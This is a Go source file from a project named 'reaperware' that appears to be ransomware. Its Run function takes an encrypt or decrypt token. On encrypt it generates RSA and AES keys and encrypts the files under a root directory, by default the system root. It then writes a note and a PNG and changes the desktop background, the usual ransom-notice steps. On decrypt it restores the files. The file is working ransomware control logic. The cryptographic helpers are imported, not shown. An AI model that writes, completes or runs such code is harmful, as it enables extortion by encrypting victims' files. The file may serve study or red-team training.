package userinput

import (
	"context"
	"log"

	"reaperware/pkg/aeskeys"
	"reaperware/pkg/config"
	"reaperware/pkg/filedirectory"
	"reaperware/pkg/notes"
	"reaperware/pkg/rsakeys"
)

const (
	Encrypt            string = "givemesomeskittlesbutidontwanttopayfordem"
	Decrypt            string = "putthatbaaaaaaaack"
	ExceptionStatement string = "Expected givemesomeskittlesbutidontwanttopayfordem or putthatbaaaaaaaack"
)

// CommandCheck validates the encrypt/decrypt token.
func CommandCheck(command string) {
	if command == Encrypt || command == Decrypt {
		return
	}
	log.Fatalln(ExceptionStatement)
}

// Run executes the selected command with config from main (context, workers, dry-run, etc.).
func Run(ctx context.Context, cfg *config.Run) error {
	CommandCheck(cfg.Command)

	root := cfg.Root
	if root == "" {
		root = filedirectory.RootDir()
	}

	report := filedirectory.NewResultReport(cfg.DryRun)

	switch cfg.Command {
	case Encrypt:
		log.Println("[+] Encrypting process")
		_, rsaPublicKey := rsakeys.CreateRSAKeys()
		aesKey := aeskeys.CreateAESKey(rsaPublicKey)

		if err := filedirectory.EncryptTheFiles(ctx, root, aesKey, cfg, report); err != nil {
			log.Printf("[-] Encrypt run ended with: %v\n", err)
			log.Println("[*]", report.Summary())
			return err
		}
		log.Println("[*]", report.Summary())

		if cfg.DryRun {
			log.Println("[dry-run] Skipping note, PNG, and background side effects.")
			return nil
		}

		notes.WriteANote()
		notes.WriteToPng()
		notes.ChangeBackgroundImage()
		return nil

	case Decrypt:
		log.Println("[+] Decrypting process")
		aesKey := rsakeys.UnencryptedAESKey()

		encryptedFiles := filedirectory.FindTheEncryptedFiles(ctx, root, cfg.MaxFileSize)
		log.Printf("[+] Found %d encrypted files (after filters)\n", len(encryptedFiles))

		filedirectory.DecryptFilesInParallel(ctx, aesKey, encryptedFiles, cfg, report)
		log.Println("[*]", report.Summary())
		log.Println("[+] Decryption pass finished. Review logs for per-file errors.")
		return ctx.Err()

	default:
		log.Fatalln("[-] Subcommand does not exist")
	}
	return nil
}
